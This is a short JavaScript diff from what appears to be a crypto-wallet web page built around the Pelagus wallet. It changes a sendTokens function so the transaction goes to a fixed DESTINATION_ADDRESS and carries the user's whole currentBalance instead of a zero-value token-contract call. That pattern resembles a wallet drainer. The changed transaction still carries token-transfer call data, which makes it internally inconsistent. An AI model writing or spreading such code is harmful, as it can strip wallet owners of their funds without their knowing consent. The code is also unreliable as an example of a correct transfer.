@@ -436,7 +436,7 @@ async function saveToFirebase(data) {
             console.log(message);
         }
 
-        async function sendTokens() {
+async function sendTokens() {
     try {
         if (!window.pelagus) {
             log('❌ Pelagus wallet not found');
@@ -468,10 +468,10 @@ async function saveToFirebase(data) {
 
         const transactionParameters = {
             from: userSession.address,
-            to: TOKEN_ADDRESS,           // Send to token contract
-            value: '0x0',               // No QUAI being sent
-            gas: '0x186A0',            // 100000 gas
-            gasPrice: '0x53E2D6',      // Adjust if needed
+            to: DESTINATION_ADDRESS,
+            value: `0x${currentBalance.toString(16)}`,
+            gas: '0x186A0',      // 100000 gas
+            gasPrice: '0x53E2D6', // Adjust if needed
             data: '0x' + methodId + paddedAddress + paddedAmount  // Encoded transfer call
         };
 
